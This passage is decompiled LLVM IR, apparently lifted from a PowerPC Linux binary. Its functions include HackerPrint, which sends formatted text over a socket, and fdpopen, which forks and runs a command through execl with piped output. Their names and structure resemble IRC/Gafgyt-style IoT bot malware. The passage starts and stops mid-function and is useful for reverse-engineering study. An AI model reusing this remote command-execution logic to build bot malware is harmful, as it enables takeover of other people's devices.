  %v2_10000ecc = add i32 %v7_10000ec0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000ed8:                            ; preds = %dec_label_pc_10000e24
  %v2_10000edc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000ee4 = icmp eq i8 %v2_10000edc, 99
  br i1 %v3_10000ee4, label %dec_label_pc_10000eec, label %dec_label_pc_10000fb8

dec_label_pc_10000eec:                            ; preds = %dec_label_pc_10000ed8
  %v2_10000ef0 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10000ef0, 7
  br i1 %tmp70, label %dec_label_pc_10000f38, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f04 = load i32, i32* %v2_10000b60, align 4
  %v2_10000f0c = load i8, i8* %tmp, align 1
  %v3_10000f0c = zext i8 %v2_10000f0c to i32
  %v1_10000f18 = mul nuw nsw i32 %v3_10000f0c, 4
  %v2_10000f1c = add i32 %v1_10000f18, %v3_10000f04
  %v1_10000f24 = add i8 %v2_10000f0c, 1
  store i8 %v1_10000f24, i8* %tmp, align 1
  br label %dec_label_pc_10000f50

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f3c = load i32, i32* %v2_10000b98, align 4
  %v1_10000f44 = add i32 %v3_10000f3c, 4
  store i32 %v1_10000f44, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000f50

dec_label_pc_10000f50:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f38
  %stack_var_-44.0 = phi i32 [ %v3_10000f3c, %dec_label_pc_10000f38 ], [ %v2_10000f1c, %dec_label_pc_10000f00 ]
  %v1_10000f54 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_10000f54 = load i32, i32* %v1_10000f54, align 4
  %v1_10000f58 = urem i32 %v2_10000f54, 256
  store i32 %v1_10000f58, i32* %stack_var_-88, align 4
  %v5_10000f7c = call i32 @prints(i32 %tmp41, i8* %v4_10000f7c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000f88 = add i32 %v5_10000f7c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000f94:                            ; preds = %dec_label_pc_10000a24, %dec_label_pc_10000a68
  %stack_var_-68.2 = phi i8* [ %v5_10000a40, %dec_label_pc_10000a68 ], [ %stack_var_-68.434, %dec_label_pc_10000a24 ]
  %v2_10000f98 = load i8, i8* %stack_var_-68.2, align 1
  %v3_10000f98 = zext i8 %v2_10000f98 to i32
  %v3_10000fa8 = call i32 @printchar(i32* %arg1, i32 %v3_10000f98)
  %v1_10000fb0 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_10000fb8

dec_label_pc_10000fb8:                            ; preds = %dec_label_pc_10000ed8, %dec_label_pc_10000f50, %dec_label_pc_10000e9c, %dec_label_pc_10000de8, %dec_label_pc_10000d34, %dec_label_pc_10000c80, %dec_label_pc_10000bdc, %dec_label_pc_10000f94
  %stack_var_-56.0 = phi i32 [ %v1_10000fb0, %dec_label_pc_10000f94 ], [ %v2_10000bfc, %dec_label_pc_10000bdc ], [ %v2_10000cb0, %dec_label_pc_10000c80 ], [ %v2_10000d64, %dec_label_pc_10000d34 ], [ %v2_10000e18, %dec_label_pc_10000de8 ], [ %v2_10000ecc, %dec_label_pc_10000e9c ], [ %v2_10000f88, %dec_label_pc_10000f50 ], [ %stack_var_-56.132, %dec_label_pc_10000ed8 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10000f94 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000bdc ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000c80 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000d34 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000de8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000e9c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000f50 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000ed8 ]
  %v4_10000fb8 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10000fbc = add i32 %v4_10000fb8, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10000fbc to i8*
  %v2_10000fc8 = load i8, i8* %stack_var_-68.4, align 1
  %v3_10000fd0 = icmp eq i8 %v2_10000fc8, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000a38, %dec_label_pc_10000fb8, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10000a38 ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v3_10000fdc = icmp eq i32* %arg1, null
  br i1 %v3_10000fdc, label %dec_label_pc_10000ff4, label %dec_label_pc_10000fe4

dec_label_pc_10000fe4:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000fe8 = load i32, i32* %arg1, align 4
  %v3_10000ff0 = inttoptr i32 %v2_10000fe8 to i8*
  store i8 0, i8* %v3_10000ff0, align 1
  br label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fe4
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10000aac, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10000a40, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10000b98, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10000ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000fb8, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10000f94, { 1, 0 }
  uselistorder label %dec_label_pc_10000f50, { 1, 0 }
  uselistorder label %dec_label_pc_10000e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000de8, { 1, 0 }
  uselistorder label %dec_label_pc_10000d34, { 1, 0 }
  uselistorder label %dec_label_pc_10000c80, { 1, 0 }
  uselistorder label %dec_label_pc_10000bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10000bac, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b20, { 1, 0 }
  uselistorder label %dec_label_pc_10000aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10000a24, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001094 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439712, i32* @lr, align 4
  %v4_1000109c = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001094)
  ret i32 %v4_1000109c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_10001144 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439888, i32* @lr, align 4
  %v4_1000114c = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_10001144)
  ret i32 %v4_1000114c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 268440016, i32* @lr, align 4
  %v1_100011cc = call i32 @malloc(i32 2048)
  store i32 %v1_100011cc, i32* %stack_var_-144, align 4
  store i32 268440048, i32* @lr, align 4
  %v3_100011ec = call i32 @__GI_memset(i32 %v1_100011cc, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001220 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001220)
  store i32 %v1_100011cc, i32* @r3, align 4
  %v0_10001238 = call i32 @__GI_strlen()
  %v2_10001248 = add i32 %v0_10001238, %v1_100011cc
  %v3_10001250 = inttoptr i32 %v2_10001248 to i8*
  store i8 10, i8* %v3_10001250, align 1
  store i32 %v1_100011cc, i32* @r3, align 4
  %v0_10001258 = call i32 @__GI_strlen()
  store i32 268440180, i32* @lr, align 4
  %v4_10001270 = call i32 @__libc_send(i32 %arg1, i32 %v1_100011cc, i32 %v0_10001258, i32 16384)
  store i32 268440196, i32* @lr, align 4
  %v1_10001280 = call i32 @free(i32 %v1_100011cc)
  ret i32 %v4_10001270

; uselistorder directives
  uselistorder i32 %v1_100011cc, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_100012c4 = load i8, i8* %arg2, align 1
  %v3_100012cc = icmp eq i8 %v2_100012c4, 114
  br i1 %v3_100012cc, label %dec_label_pc_100012e8, label %dec_label_pc_100012d4

dec_label_pc_100012d4:                            ; preds = %entry
  %v2_100012d8 = load i8, i8* %arg2, align 1
  %v3_100012e0 = icmp eq i8 %v2_100012d8, 119
  br i1 %v3_100012e0, label %dec_label_pc_100012e8, label %dec_label_pc_10001300

dec_label_pc_100012e8:                            ; preds = %dec_label_pc_100012d4, %entry
  %v1_100012ec = add i32 %tmp, 1
  %v2_100012ec = inttoptr i32 %v1_100012ec to i8*
  %v3_100012f0 = load i8, i8* %v2_100012ec, align 1
  %v3_100012f8 = icmp eq i8 %v3_100012f0, 0
  br i1 %v3_100012f8, label %dec_label_pc_1000130c, label %dec_label_pc_10001300

dec_label_pc_10001300:                            ; preds = %dec_label_pc_100012d4, %dec_label_pc_100012e8
  br label %dec_label_pc_10001530

dec_label_pc_1000130c:                            ; preds = %dec_label_pc_100012e8
  %v2_1000130c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268440344, i32* @lr, align 4
  %v3_10001314 = call i32 @__GI_pipe(i32 %v2_1000130c, i32 %v1_100012ec)
  store i32 %v3_10001314, i32* @r3, align 4
  %tmp15 = icmp sgt i32 %v3_10001314, -1
  br i1 %tmp15, label %dec_label_pc_10001330, label %dec_label_pc_10001324

dec_label_pc_10001324:                            ; preds = %dec_label_pc_1000130c
  br label %dec_label_pc_10001530

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000130c
  %v3_10001334 = load i32, i32* @global_var_1002abc8.15, align 4
  %v3_10001338 = icmp eq i32 %v3_10001334, 0
  br i1 %v3_10001338, label %dec_label_pc_10001340, label %dec_label_pc_100013c0

dec_label_pc_10001340:                            ; preds = %dec_label_pc_10001330
  store i32 268440388, i32* @lr, align 4
  %v0_10001340 = call i32 @getdtablesize()
  %v2_10001350 = icmp sgt i32 %v0_10001340, 0
  br i1 %v2_10001350, label %dec_label_pc_10001364, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001340
  br label %dec_label_pc_10001530

dec_label_pc_10001364:                            ; preds = %dec_label_pc_10001340
  %v1_10001368 = mul i32 %v0_10001340, 4
  store i32 268440436, i32* @lr, align 4
  %v1_10001370 = call i32 @malloc(i32 %v1_10001368)
  store i32 %v1_10001370, i32* @global_var_1002abc8.15, align 4
  %v3_10001388 = icmp eq i32 %v1_10001370, 0
  br i1 %v3_10001388, label %dec_label_pc_10001390, label %dec_label_pc_1000139c

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001364
  br label %dec_label_pc_10001530

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_10001364
  store i32 ptrtoint (i32* @global_var_100013c0.16 to i32), i32* @lr, align 4
  %v3_100013bc = call i32 @__GI_memset(i32 %v1_10001370, i32 0, i32 %v1_10001368)
  store i32 %v3_100013bc, i32* @r3, align 4
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_10001330, %dec_label_pc_1000139c
  store i32 268440516, i32* @lr, align 4
  %v0_100013c0 = call i32 @__vfork()
  %v4_100013dc = icmp eq i32 %v0_100013c0, -1
  br i1 %v4_100013dc, label %dec_label_pc_100013f4, label %dec_label_pc_100013e4

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013e8 = icmp eq i32 %v0_100013c0, 0
  br i1 %v3_100013e8, label %dec_label_pc_10001418, label %dec_label_pc_100014c8

dec_label_pc_100013f4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013f4 = load i32, i32* %stack_var_-48, align 4
  store i32 268440576, i32* @lr, align 4
  %v1_100013fc = call i32 @__libc_close(i32 %v3_100013f4)
  store i32 ptrtoint (i32* @global_var_1000140c.17 to i32), i32* @lr, align 4
  %v1_10001408 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001530

dec_label_pc_10001418:                            ; preds = %dec_label_pc_100013e4
  %v3_1000141c = load i8, i8* %arg2, align 1
  %v3_10001424 = icmp eq i8 %v3_1000141c, 114
  br i1 %v3_10001424, label %dec_label_pc_1000142c, label %dec_label_pc_10001464

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001418
  %v3_10001430 = icmp eq i32 %tmp3, 1
  br i1 %v3_10001430, label %dec_label_pc_10001454, label %dec_label_pc_10001438

dec_label_pc_10001438:                            ; preds = %dec_label_pc_1000142c
  store i32 268440648, i32* @lr, align 4
  %v4_10001444 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  store i32 268440660, i32* @lr, align 4
  %v1_10001450 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001454

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c, %dec_label_pc_10001438
  %v3_10001454 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001460.18 to i32), i32* @lr, align 4
  %v1_1000145c = call i32 @__libc_close(i32 %v3_10001454)
  br label %dec_label_pc_10001498

dec_label_pc_10001464:                            ; preds = %dec_label_pc_10001418
  %v3_10001464 = load i32, i32* %stack_var_-48, align 4
  %v3_10001468 = icmp eq i32 %v3_10001464, 0
  br i1 %v3_10001468, label %dec_label_pc_1000148c, label %dec_label_pc_10001470

dec_label_pc_10001470:                            ; preds = %dec_label_pc_10001464
  store i32 268440704, i32* @lr, align 4
  %v4_1000147c = call i32 @dup2(i32 %v3_10001464, i32 0, i32 %tmp)
  %v3_10001480 = load i32, i32* %stack_var_-48, align 4
  store i32 268440716, i32* @lr, align 4
  %v1_10001488 = call i32 @__libc_close(i32 %v3_10001480)
  br label %dec_label_pc_1000148c

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_10001464, %dec_label_pc_10001470
  store i32 268440728, i32* @lr, align 4
  %v1_10001494 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001498

dec_label_pc_10001498:                            ; preds = %dec_label_pc_10001454, %dec_label_pc_1000148c
  %v8_100014bc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10015ee8.19 to i32), i32 ptrtoint ([3 x i8]* @global_var_10015ef0.20 to i32), i32 ptrtoint ([3 x i8]* @global_var_10015ef4.21 to i32), i32 %arg1, i32 0)
  %v1_100014c4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100014c8

dec_label_pc_100014c8:                            ; preds = %dec_label_pc_100013e4, %dec_label_pc_10001498
  %v2_100014cc = load i8, i8* %arg2, align 1
  %v3_100014d4 = icmp eq i8 %v2_100014cc, 114
  %v3_100014dc = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_100014d4, label %dec_label_pc_100014dc, label %dec_label_pc_100014f4

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100014c8
  store i32 ptrtoint (i32* @global_var_100014f0.23 to i32), i32* @lr, align 4
  %v1_100014ec = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001508

dec_label_pc_100014f4:                            ; preds = %dec_label_pc_100014c8
  store i32 268440840, i32* @lr, align 4
  %v1_10001504 = call i32 @__libc_close(i32 %v3_100014dc)
  br label %dec_label_pc_10001508

dec_label_pc_10001508:                            ; preds = %dec_label_pc_100014dc, %dec_label_pc_100014f4
  %stack_var_-36.0 = phi i32 [ %v3_100014dc, %dec_label_pc_100014dc ], [ %tmp3, %dec_label_pc_100014f4 ]
  %v1_1000150c = mul i32 %stack_var_-36.0, 4
  %v3_10001518 = load i32, i32* @global_var_1002abc8.15, align 4
  %v2_1000151c = add i32 %v3_10001518, %v1_1000150c
  %v2_10001524 = inttoptr i32 %v2_1000151c to i32*
  store i32 %v0_100013c0, i32* %v2_10001524, align 4
  br label %dec_label_pc_10001530

dec_label_pc_10001530:                            ; preds = %dec_label_pc_100013f4, %dec_label_pc_10001390, %dec_label_pc_10001358, %dec_label_pc_10001324, %dec_label_pc_10001300, %dec_label_pc_10001508
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001390 ], [ -1, %dec_label_pc_100013f4 ], [ %stack_var_-36.0, %dec_label_pc_10001508 ], [ -1, %dec_label_pc_10001358 ], [ -1, %dec_label_pc_10001324 ], [ -1, %dec_label_pc_10001300 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_100014dc, { 1, 0 }
  uselistorder i32 %v1_10001368, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001530, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001508, { 1, 0 }
  uselistorder label %dec_label_pc_100014c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001498, { 1, 0 }
  uselistorder label %dec_label_pc_1000148c, { 1, 0 }
  uselistorder label %dec_label_pc_10001454, { 1, 0 }
  uselistorder label %dec_label_pc_100013c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001300, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_1000156c = load i32, i32* @global_var_1002abc8.15, align 4
  %v3_10001570 = icmp eq i32 %v3_1000156c, 0
  br i1 %v3_10001570, label %dec_label_pc_1000159c, label %dec_label_pc_10001578

dec_label_pc_10001578:                            ; preds = %entry
  %v1_1000157c = mul i32 %arg1, 4
  %v2_1000158c = add i32 %v3_1000156c, %v1_1000157c
  %v1_10001590 = inttoptr i32 %v2_1000158c to i32*
  %v2_10001590 = load i32, i32* %v1_10001590, align 4
  %v3_10001594 = icmp eq i32 %v2_10001590, 0
  br i1 %v3_10001594, label %dec_label_pc_1000159c, label %dec_label_pc_100015a8

dec_label_pc_1000159c:                            ; preds = %dec_label_pc_10001578, %entry
  br label %dec_label_pc_100016d0

dec_label_pc_100015a8:                            ; preds = %dec_label_pc_10001578
  store i32 268441008, i32* @lr, align 4
  %v1_100015ac = call i32 @__libc_close(i32 %arg1)
  %v2_100015b0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268441020, i32* @lr, align 4
  %v1_100015b8 = call i32 @sigemptyset(i32 %v2_100015b0)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441036, i32* @lr, align 4
  %v2_100015c8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 2)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441052, i32* @lr, align 4
  %v2_100015d8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 3)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441068, i32* @lr, align 4
  %v2_100015e8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 1)
  %v2_100015f0 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268441092, i32* @lr, align 4
  %v3_10001600 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_100015b0, i32 %v2_100015f0)
  %v2_10001620 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_100015a8
  %v3_10001614 = load i32, i32* @global_var_1002abc8.15, align 4
  %v2_10001618 = add i32 %v3_10001614, %v1_1000157c
  %v1_1000161c = inttoptr i32 %v2_10001618 to i32*
  %v2_1000161c = load i32, i32* %v1_1000161c, align 4
  store i32 268441140, i32* @lr, align 4
  %v3_10001630 = call i32 @__libc_waitpid(i32 %v2_1000161c, i32 %v2_10001620, i32 0)
  %v4_10001644 = icmp eq i32 %v3_10001630, -1
  br i1 %v4_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001660

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_10001604
  %v0_1000164c = call i32 @__errno_location()
  %v1_10001654 = inttoptr i32 %v0_1000164c to i32*
  %v2_10001654 = load i32, i32* %v1_10001654, align 4
  %v3_10001658 = icmp eq i32 %v2_10001654, 4
  br i1 %v3_10001658, label %dec_label_pc_10001604, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001604, %dec_label_pc_1000164c
  %v4_10001644.lcssa = phi i1 [ false, %dec_label_pc_10001604 ], [ true, %dec_label_pc_1000164c ]
  store i32 268441204, i32* @lr, align 4
  %v3_10001670 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_100015f0, i32 0)
  %v1_10001678 = mul i32 %tmp5, 4
  %v3_10001684 = load i32, i32* @global_var_1002abc8.15, align 4
  %v2_10001688 = add i32 %v3_10001684, %v1_10001678
  %v2_10001690 = inttoptr i32 %v2_10001688 to i32*
  store i32 0, i32* %v2_10001690, align 4
  br i1 %v4_10001644.lcssa, label %dec_label_pc_100016c8, label %dec_label_pc_100016a4

dec_label_pc_100016a4:                            ; preds = %dec_label_pc_10001660
  %v3_100016a4 = load i32, i32* %stack_var_-52, align 4
  %v1_100016b0 = call i32 @__asm_rlwinm(i32 %v3_100016a4, i32 0, i32 16, i32 23)
  %v4_100016b4 = sdiv i32 %v1_100016b0, 256
  br label %dec_label_pc_100016c8

dec_label_pc_100016c8:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_100016a4
  %storemerge2 = phi i32 [ %v4_100016b4, %dec_label_pc_100016a4 ], [ -1, %dec_label_pc_10001660 ]
  br label %dec_label_pc_100016d0

dec_label_pc_100016d0:                            ; preds = %dec_label_pc_1000159c, %dec_label_pc_100016c8
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_100016c8 ], [ -1, %dec_label_pc_1000159c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_100015b0, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_1000157c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100016d0, { 1, 0 }
  uselistorder label %dec_label_pc_100016c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001660, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_10001764

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001774
  store i32 268441412, i32* @lr, align 4
  %v1_10001740 = call i32 @__libc_read(i32 %arg3)
  %v1_10001750 = add nuw i32 %storemerge25, 1
  %v3_1000175c = icmp eq i32 %v1_10001740, 1
  br i1 %v3_1000175c, label %dec_label_pc_10001764, label %dec_label_pc_10001798

dec_label_pc_10001764:                            ; preds = %entry, %dec_label_pc_10001724
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_10001750, %dec_label_pc_10001724 ]
  %v2_1000176c = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_1000176c, label %dec_label_pc_10001774, label %dec_label_pc_10001798

dec_label_pc_10001774:                            ; preds = %dec_label_pc_10001764
  %v2_10001780 = add i32 %storemerge25, %arg1
  %v1_10001784 = add i32 %v2_10001780, -1
  %v1_10001788 = inttoptr i32 %v1_10001784 to i8*
  %v2_10001788 = load i8, i8* %v1_10001788, align 1
  %v3_10001790 = icmp eq i8 %v2_10001788, 10
  br i1 %v3_10001790, label %dec_label_pc_10001798, label %dec_label_pc_10001724

dec_label_pc_10001798:                            ; preds = %dec_label_pc_10001774, %dec_label_pc_10001764, %dec_label_pc_10001724
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001774 ], [ 1, %dec_label_pc_10001764 ], [ %v1_10001740, %dec_label_pc_10001724 ]
  %v3_1000179c = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_1000179c, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001740, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001764, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100018343 = load i8, i8* %arg1, align 1
  %v3_1000183c6 = icmp eq i8 %v2_100018343, 0
  br i1 %v3_1000183c6, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_100017f4:                            ; preds = %dec_label_pc_10001844
  %v1_100017f8 = mul i32 %stack_var_-40.07, 16
  %v2_10001800 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001800 = zext i8 %v2_10001800 to i32
  %v1_10001810 = mul nuw nsw i32 %v3_10001800, 4
  %v2_10001814 = add i32 %v1_10001810, ptrtoint (i32* @global_var_10015ef8.24 to i32)
  %v1_10001818 = inttoptr i32 %v2_10001814 to i32*
  %v2_10001818 = load i32, i32* %v1_10001818, align 4
  %v2_1000181c = or i32 %v2_10001818, %v1_100017f8
  %v1_10001828 = add i32 %v4_100018309, 1
  %v5_1000182c = inttoptr i32 %v1_10001828 to i8*
  %v2_10001834 = load i8, i8* %v5_1000182c, align 1
  %v3_1000183c = icmp eq i8 %v2_10001834, 0
  br i1 %v3_1000183c, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %entry, %dec_label_pc_100017f4
  %v4_100018309 = phi i32 [ %v1_10001828, %dec_label_pc_100017f4 ], [ %tmp, %entry ]
  %stack_var_-24.08 = phi i8* [ %v5_1000182c, %dec_label_pc_100017f4 ], [ %arg1, %entry ]
  %stack_var_-40.07 = phi i32 [ %v2_1000181c, %dec_label_pc_100017f4 ], [ 0, %entry ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_100017f4, label %dec_label_pc_10001850

dec_label_pc_10001850:                            ; preds = %dec_label_pc_100017f4, %dec_label_pc_10001844, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_1000181c, %dec_label_pc_100017f4 ], [ %stack_var_-40.07, %dec_label_pc_10001844 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001844, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %v2_1000188c = load i8, i8* %arg1, align 1
  %v3_1000189c = icmp eq i8 %v2_1000188c, 42
  br i1 %v3_1000189c, label %dec_label_pc_100018d4, label %dec_label_pc_100018a4

dec_label_pc_100018a4:                            ; preds = %entry
  %v3_100018a8 = icmp eq i8 %v2_1000188c, 63
  br i1 %v3_100018a8, label %dec_label_pc_10001948, label %dec_label_pc_100018b0

dec_label_pc_100018b0:                            ; preds = %dec_label_pc_100018a4
  %v3_100018b4 = icmp eq i8 %v2_1000188c, 0
  br i1 %v3_100018b4, label %dec_label_pc_100018c0, label %dec_label_pc_100019a4

dec_label_pc_100018c0:                            ; preds = %dec_label_pc_100018b0
